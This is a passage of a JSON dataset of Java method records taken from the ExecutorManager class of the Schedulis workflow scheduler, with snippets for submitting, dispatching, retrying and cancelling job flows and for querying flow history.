"String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void retryFailures(final ExecutableFlow exFlow, final String userId)\n      throws ExecutorManagerException {\n    modifyExecutingJobs(exFlow, ConnectorParams.MODIFY_RETRY_FAILURES, userId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34432, "method_name": "skipAllFailures", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void skipAllFailures(ExecutableFlow exFlow, String userId) throws ExecutorManagerException {\n    synchronized (exFlow) {\n      final Pair<ExecutionReference, ExecutableFlow> pair =\n          this.runningExecutions.get().get(exFlow.getExecutionId());\n      if (pair == null) {\n        throw new ExecutorManagerException(\"Execution \"\n            + exFlow.getExecutionId() + \" of flow \" + exFlow.getFlowId()\n            + \" isn't running.\");\n      }\n      this.apiGateway.callWithReferenceByUser(pair.getFirst(),\n          ConnectorParams.SKIPPED_ALL_FAILED_JOBS_ACTION, userId);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34433, "method_name": "retryExecutingJobs", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void retryExecutingJobs(final ExecutableFlow exFlow, final String userId,\n      final String... jobIds) throws ExecutorManagerException {\n    modifyExecutingJobs(exFlow, ConnectorParams.MODIFY_RETRY_JOBS, userId,\n        jobIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34434, "method_name": "disableExecutingJobs", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void disableExecutingJobs(final ExecutableFlow exFlow, final String userId,\n      final String... jobIds) throws ExecutorManagerException {\n    modifyExecutingJobs(exFlow, ConnectorParams.MODIFY_DISABLE_JOBS, userId,\n        jobIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34435, "method_name": "enableExecutingJobs", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void enableExecutingJobs(final ExecutableFlow exFlow, final String userId,\n      final String... jobIds) throws ExecutorManagerException {\n    modifyExecutingJobs(exFlow, ConnectorParams.MODIFY_ENABLE_JOBS, userId,\n        jobIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34436, "method_name": "cancelExecutingJobs", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void cancelExecutingJobs(final ExecutableFlow exFlow, final String userId,\n      final String... jobIds) throws ExecutorManagerException {\n    modifyExecutingJobs(exFlow, ConnectorParams.MODIFY_CANCEL_JOBS, userId,\n        jobIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34437, "method_name": "modifyExecutingJobs", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["private"], "return_type": "Map<String,Object>", "snippet": "  private Map<String, Object> modifyExecutingJobs(final ExecutableFlow exFlow,\n      final String command, final String userId, final String... jobIds)\n      throws ExecutorManagerException {\n    synchronized (exFlow) {\n      final Pair<ExecutionReference, ExecutableFlow> pair =\n          this.runningExecutions.get().get(exFlow.getExecutionId());\n      if (pair == null) {\n        throw new ExecutorManagerException(\"Execution \"\n            + exFlow.getExecutionId() + \" of flow \" + exFlow.getFlowId()\n            + \" isn't running.\");\n      }\n\n      final Map<String, Object> response;\n      if (jobIds != null && jobIds.length > 0) {\n        for (final String jobId : jobIds) {\n          if (!jobId.isEmpty()) {\n            final ExecutableNode node = exFlow.getExecutableNode(jobId);\n            if (node == null) {\n              throw new ExecutorManagerException(\"Job \" + jobId\n                  + \" doesn't exist in execution \" + exFlow.getExecutionId()\n                  + \".\");\n            }\n          }\n        }\n        final String ids = StringUtils.join(jobIds, ',');\n        response =\n            this.apiGateway.callWithReferenceByUser(pair.getFirst(),\n                ConnectorParams.MODIFY_EXECUTION_ACTION, userId,\n                new Pair<>(\n                    ConnectorParams.MODIFY_EXECUTION_ACTION_TYPE, command),\n                new Pair<>(ConnectorParams.MODIFY_JOBS_LIST, ids));\n      } else {\n        response =\n            this.apiGateway.callWithReferenceByUser(pair.getFirst(),\n                ConnectorParams.MODIFY_EXECUTION_ACTION, userId,\n                new Pair<>(\n                    ConnectorParams.MODIFY_EXECUTION_ACTION_TYPE, command));\n      }\n\n      return response;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34438, "method_name": "submitExecutableFlow", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "String", "snippet": "  public String submitExecutableFlow(final ExecutableFlow exflow, final String userId)\n      throws ExecutorManagerException {\n\n    final String exFlowKey = exflow.getProjectName() + \".\" + exflow.getId() + \".submitFlow\";\n    // using project and flow name to prevent race condition when same flow is submitted by API and schedule at the same time\n    // causing two same flow submission entering this piece.\n    synchronized (exFlowKey.intern()) {\n      final String flowId = exflow.getFlowId();\n\n      logger.info(\"Submitting execution flow \" + flowId + \" by \" + userId);\n\n      String message = \"\";\n      if (this.queuedFlows.isFull()) {\n        message =\n            String\n                .format(\n                    \"Failed to submit %s for project %s. Azkaban has overrun its webserver queue capacity\",\n                    flowId, exflow.getProjectName());\n        logger.error(message);\n        this.commonMetrics.markSubmitFlowFail();\n      } else {\n        final int projectId = exflow.getProjectId();\n        exflow.setSubmitUser(userId);\n        // FIXME The multi-tenant function allocates the corresponding executor to the current job stream according to the submitting user.\n        List<Integer> executorIds = null;\n        try {\n          executorIds = this.executorLoader.getExecutorIdsBySubmitUser(exflow.getSubmitUser());\n        }catch (ExecutorManagerException em){\n          logger.error(\"get executorId by \" + exflow.getSubmitUser() + \", failed\", em);\n          throw new ExecutorManagerException(\"get executorId by \" + exflow.getSubmitUser() + \", failed\", em);\n        }\n        if(executorIds == null || executorIds.size() == 0){\n          logger.error(\"can not found executorId by \" + exflow.getSubmitUser());\n          throw new ExecutorManagerException(\"\u7528\u6237:\" + exflow.getSubmitUser() + \"\uff0c\u6ca1\u6709\u5206\u914dexecutor\");\n        }\n\n        exflow.setExecutorIds(executorIds);\n        exflow.setSubmitTime(System.currentTimeMillis());\n\n        // Get collection of running flows given a project and a specific flow name\n        final List<Integer> running = getRunningFlows(projectId, flowId);\n\n        ExecutionOptions options = exflow.getExecutionOptions();\n        if (options == null) {\n          options = new ExecutionOptions();\n        }\n\n        if (options.getDisabledJobs() != null) {\n          FlowUtils.applyDisabledJobs(options.getDisabledJobs(), exflow);\n        }\n        \n        if (!running.isEmpty()) {\n          if (running.size() > this.maxConcurrentRunsOneFlow) {\n            this.commonMetrics.markSubmitFlowSkip();\n            throw new ExecutorManagerException(\"Flow \" + flowId\n                + \" has more than \" + this.maxConcurrentRunsOneFlow + \" concurrent runs. Skipping\",\n                ExecutorManagerException.Reason.SkippedExecution);\n          } else if (options.getConcurrentOption().equals(\n              ExecutionOptions.CONCURRENT_OPTION_PIPELINE)) {\n            Collections.sort(running);\n            final Integer runningExecId = running.get(running.size() - 1);\n\n            options.setPipelineExecutionId(runningExecId);\n            message =\n                \"Flow \" + flowId + \" is already running with exec id \"\n                    + runningExecId + \". Pipelining level \"\n                    + options.getPipelineLevel() + \". \\n\";\n          } else if (options.getConcurrentOption().equals(\n              ExecutionOptions.CONCURRENT_OPTION_SKIP)) {\n            this.commonMetrics.markSubmitFlowSkip();\n            throw new ExecutorManagerException(\"\u5de5\u4f5c\u6d41 \" + flowId\n                + \" \u6b63\u5728\u8fd0\u884c. \u8df3\u8fc7\u6267\u884c.\",\n                ExecutorManagerException.Reason.SkippedExecution);\n          } else {\n            // The settings is to run anyways.\n            message =\n                \"Flow \" + flowId + \" is already running with exec id \"\n                    + StringUtils.join(running, \",\")\n                    + \". Will execute concurrently. \\n\";\n          }\n        }\n\n        final boolean memoryCheck =\n            !ProjectWhitelist.isProjectWhitelisted(exflow.getProjectId(),\n                ProjectWhitelist.WhitelistType.MemoryCheck);\n        options.setMemoryCheck(memoryCheck);\n        // first insert Data in DB\n        // The exflow id is set by the loader. So it's unavailable until after\n        // this call. \u5199\u6570\u636e\u5e93\u8868execution_flows\uff0c\u72b6\u6001\u4e3apreparing\u3002\n        this.executorLoader.uploadExecutableFlow(exflow);\n\n\n        // We create an active flow reference in the datastore. If the upload\n        // fails, we remove the reference.\n        final ExecutionReference reference =\n            new ExecutionReference(exflow.getExecutionId());\n\n        this.executorLoader.addActiveExecutableReference(reference);\n        this.queuedFlows.enqueue(exflow, reference);\n        message += \"Execution queued successfully with exec id \" + exflow.getExecutionId();\n        logger.info(message);\n        this.commonMetrics.markSubmitFlowSuccess();\n      }\n      return message;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34439, "method_name": "cleanOldExecutionLogs", "class_name": "ExecutorManager", "params": ["long"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void cleanOldExecutionLogs(final long millis) {\n    final long beforeDeleteLogsTimestamp = System.currentTimeMillis();\n    try {\n      final int count = this.executorLoader.removeExecutionLogsByTime(millis);\n      logger.info(\"Cleaned up \" + count + \" log entries.\");\n    } catch (final ExecutorManagerException e) {\n      logger.error(\"log clean up failed. \", e);\n    }\n    logger.info(\n        \"log clean up time: \" + (System.currentTimeMillis() - beforeDeleteLogsTimestamp) / 1000\n            + \" seconds.\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34440, "method_name": "callExecutorStats", "class_name": "ExecutorManager", "params": ["int", "String", "Pair<String,String>"], "throws": ["IOException", "ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> callExecutorStats(final int executorId, final String action,\n      final Pair<String, String>... params) throws IOException, ExecutorManagerException {\n    final Executor executor = fetchExecutor(executorId);\n\n    final List<Pair<String, String>> paramList =\n        new ArrayList<>();\n\n    // if params = null\n    if (params != null) {\n      paramList.addAll(Arrays.asList(params));\n    }\n\n    paramList\n        .add(new Pair<>(ConnectorParams.ACTION_PARAM, action));\n\n    return this.apiGateway.callForJsonObjectMap(executor.getHost(), executor.getPort(),\n        \"/stats\", paramList);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34441, "method_name": "callExecutorJMX", "class_name": "ExecutorManager", "params": ["String", "String", "String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> callExecutorJMX(final String hostPort, final String action,\n      final String mBean) throws IOException {\n    final List<Pair<String, String>> paramList =\n        new ArrayList<>();\n\n    paramList.add(new Pair<>(action, \"\"));\n    if (mBean != null) {\n      paramList.add(new Pair<>(ConnectorParams.JMX_MBEAN, mBean));\n    }\n\n    final String[] hostPortSplit = hostPort.split(\":\");\n    return this.apiGateway.callForJsonObjectMap(hostPortSplit[0],\n        Integer.valueOf(hostPortSplit[1]), \"/jmx\", paramList);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34442, "method_name": "shutdown", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void shutdown() {\n    this.queueProcessor.shutdown();\n    this.updaterThread.shutdown();\n    this.cleanerThread.shutdown();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34443, "method_name": "failEverything", "class_name": "ExecutorManager", "params": ["ExecutableFlow"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void failEverything(final ExecutableFlow exFlow) {\n    final long time = System.currentTimeMillis();\n    for (final ExecutableNode node : exFlow.getExecutableNodes()) {\n      switch (node.getStatus()) {\n        case SUCCEEDED:\n        case FAILED:\n        case KILLED:\n        case SKIPPED:\n        case DISABLED:\n        case FAILED_SKIPPED:\n          continue;\n          // case UNKNOWN:\n        case READY:\n          node.setStatus(Status.KILLING);\n          break;\n        default:\n          node.setStatus(Status.FAILED);\n          break;\n      }\n\n      if (node.getStartTime() == -1) {\n        node.setStartTime(time);\n      }\n      if (node.getEndTime() == -1) {\n        node.setEndTime(time);\n      }\n    }\n\n    if (exFlow.getEndTime() == -1) {\n      exFlow.setEndTime(time);\n    }\n\n    exFlow.setStatus(Status.FAILED);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34444, "method_name": "isFinished", "class_name": "ExecutorManager", "params": ["ExecutableFlow"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isFinished(final ExecutableFlow flow) {\n    switch (flow.getStatus()) {\n      case SUCCEEDED:\n      case FAILED:\n      case KILLED:\n        return true;\n      default:\n        return false;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34445, "method_name": "isFailedFinishing", "class_name": "ExecutorManager", "params": ["ExecutableFlow"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isFailedFinishing(final ExecutableFlow flow) {\n    switch (flow.getStatus()) {\n      case FAILED_FINISHING:\n        return true;\n      default:\n        return false;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34446, "method_name": "fillUpdateTimeAndExecId", "class_name": "ExecutorManager", "params": ["List<ExecutableFlow>", "List<Integer>", "List<Long>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void fillUpdateTimeAndExecId(final List<ExecutableFlow> flows,\n      final List<Integer> executionIds, final List<Long> updateTimes) {\n    for (final ExecutableFlow flow : flows) {\n      executionIds.add(flow.getExecutionId());\n      updateTimes.add(flow.getUpdateTime());\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34447, "method_name": "getExecutableFlows", "class_name": "ExecutorManager", "params": ["int", "String", "int", "int", "List<ExecutableFlow>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecutableFlows(final int projectId, final String flowId, final int from,\n      final int length, final List<ExecutableFlow> outputList)\n      throws ExecutorManagerException {\n    final List<ExecutableFlow> flows =\n        this.executorLoader.fetchFlowHistory(projectId, flowId, from, length);\n    outputList.addAll(flows);\n    return this.executorLoader.fetchNumExecutableFlows(projectId, flowId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34448, "method_name": "getExecutableFlows", "class_name": "ExecutorManager", "params": ["int", "String", "int", "int", "Status"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getExecutableFlows(final int projectId, final String flowId,\n      final int from, final int length, final Status status) throws ExecutorManagerException {\n    return this.executorLoader.fetchFlowHistory(projectId, flowId, from, length,\n        status);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34449, "method_name": "dispatch", "class_name": "ExecutorManager", "params": ["ExecutionReference", "ExecutableFlow", "Executor"], "throws": ["ExecutorManagerException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void dispatch(final ExecutionReference reference, final ExecutableFlow exflow,\n      final Executor choosenExecutor) throws ExecutorManagerException {\n    exflow.setUpdateTime(System.currentTimeMillis());\n\n    this.executorLoader.assignExecutor(choosenExecutor.getId(),\n        exflow.getExecutionId());\n    try {\n      this.apiGateway.callWithExecutable(exflow, choosenExecutor,\n          ConnectorParams.EXECUTE_ACTION);\n    } catch (final ExecutorManagerException ex) {\n      logger.error(\"Rolling back executor assignment for execution id:\"\n          + exflow.getExecutionId(), ex);\n      this.executorLoader.unassignExecutor(exflow.getExecutionId());\n      throw new ExecutorManagerException(ex);\n    }\n    reference.setExecutor(choosenExecutor);\n\n    // move from flow to running flows\n    this.runningExecutions.get().put(exflow.getExecutionId(), new Pair<>(reference, exflow));\n    synchronized (this.runningExecutions.get()) {\n      // Wake up RunningExecutionsUpdaterThread from wait() so that it will immediately check status\n      // from executor(s). Normally flows will run at least some time and can't be cleaned up\n      // immediately, so there will be another wait round (or many, actually), but for unit tests\n      // this is significant to let them run quickly.\n      this.runningExecutions.get().notifyAll();\n    }\n    synchronized (this) {\n      // wake up all internal waiting threads, too\n      this.notifyAll();\n    }\n\n    logger.info(String.format(\n        \"Successfully dispatched exec %d with error count %d\",\n        exflow.getExecutionId(), reference.getNumErrors()));\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34450, "method_name": "setSleepAfterDispatchFailure", "class_name": "ExecutorManager", "params": ["Duration"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void setSleepAfterDispatchFailure(final Duration sleepAfterDispatchFailure) {\n    this.sleepAfterDispatchFailure = sleepAfterDispatchFailure;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34451, "method_name": "getUserExecutableFlows", "class_name": "ExecutorManager", "params": ["int", "int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getUserExecutableFlows(int skip, int size, String user)\n      throws ExecutorManagerException {\n    List<ExecutableFlow> flows = executorLoader.fetchUserFlowHistory(skip, size, user);\n    return flows;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34452, "method_name": "getUserExecutableFlowsByAdvanceFilter", "class_name": "ExecutorManager", "params": ["String", "String", "String", "String", "String", "long", "long", "int", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getUserExecutableFlowsByAdvanceFilter(String projContain,\n      String flowContain, String execIdContain,  String userContain, String status, long begin, long end,\n      int skip, int size, int flowType) throws ExecutorManagerException {\n    List<ExecutableFlow> flows =\n        executorLoader.fetchUserFlowHistoryByAdvanceFilter(projContain, flowContain, execIdContain,\n                userContain, status, begin, end, skip, size, flowType);\n\n    return flows;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34453, "method_name": "getUserExecutableFlowsQuickSearch", "class_name": "ExecutorManager", "params": ["String", "String", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getUserExecutableFlowsQuickSearch(String flowIdContains, String user,\n      int skip, int size) throws ExecutorManagerException {\n    List<ExecutableFlow> flows =\n        executorLoader.fetchFlowHistoryQuickSearch('%' + flowIdContains + '%', user, skip, size);\n\n    return flows;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34454, "method_name": "getProjectLastExecutableFlow", "class_name": "ExecutorManager", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "ExecutableFlow", "snippet": "  public ExecutableFlow getProjectLastExecutableFlow(int projectId, String flowId) throws ExecutorManagerException{\n    ExecutableFlow flow = executorLoader.getProjectLastExecutableFlow(projectId, flowId);\n    return flow;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34455, "method_name": "getExecutionCycleTotal", "class_name": "ExecutorManager", "params": ["Optional<String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecutionCycleTotal(Optional<String> usernameOp) throws ExecutorManagerException {\n    return executorLoader.getExecutionCycleTotal(usernameOp);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34456, "method_name": "getExecutionCycleTotal", "class_name": "ExecutorManager", "params": ["String", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecutionCycleTotal(String username, List<Integer> projectIds) throws ExecutorManagerException {\n    return executorLoader.getExecutionCycleTotal(username, projectIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34457, "method_name": "listExecutionCycleFlows", "class_name": "ExecutorManager", "params": ["Optional<String>", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutionCycle>", "snippet": "  public List<ExecutionCycle> listExecutionCycleFlows(Optional<String> username, int offset, int length)\n          throws ExecutorManagerException {\n    return executorLoader.listExecutionCycleFlows(username, offset, length);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34458, "method_name": "listExecutionCycleFlows", "class_name": "ExecutorManager", "params": ["String", "List<Integer>", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutionCycle>", "snippet": "  public List<ExecutionCycle> listExecutionCycleFlows(String username, List<Integer> projectIds, int offset, int length)\n          throws ExecutorManagerException {\n    return executorLoader.listExecutionCycleFlows(username, projectIds, offset, length);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34459, "method_name": "saveExecutionCycleFlow", "class_name": "ExecutorManager", "params": ["ExecutionCycle"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int saveExecutionCycleFlow(ExecutionCycle cycleFlow) throws ExecutorManagerException {\n    return executorLoader.saveExecutionCycleFlow(cycleFlow);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34460, "method_name": "getExecutionCycleFlow", "class_name": "ExecutorManager", "params": ["String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "ExecutionCycle", "snippet": "  public ExecutionCycle getExecutionCycleFlow(String projectId, String flowId) throws ExecutorManagerException {\n    return executorLoader.getExecutionCycleFlow(projectId, flowId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34461, "method_name": "getExecutionCycleFlow", "class_name": "ExecutorManager", "params": ["int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "ExecutionCycle", "snippet": "  public ExecutionCycle getExecutionCycleFlow(int id) throws ExecutorManagerException {\n    return executorLoader.getExecutionCycleFlow(id);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34462, "method_name": "updateExecutionFlow", "class_name": "ExecutorManager", "params": ["ExecutionCycle"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int updateExecutionFlow(ExecutionCycle executionCycle) throws ExecutorManagerException {\n    return executorLoader.updateExecutionFlow(executionCycle);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34463, "method_name": "stopAllCycleFlows", "class_name": "ExecutorManager", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int stopAllCycleFlows() throws ExecutorManagerException {\n    return executorLoader.stopAllCycleFlows();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34464, "method_name": "getAllRunningCycleFlows", "class_name": "ExecutorManager", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutionCycle>", "snippet": "  public List<ExecutionCycle> getAllRunningCycleFlows() throws ExecutorManagerException {\n    return executorLoader.getAllRunningCycleFlows();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34465, "method_name": "getDownLoadAllExecutionLog", "class_name": 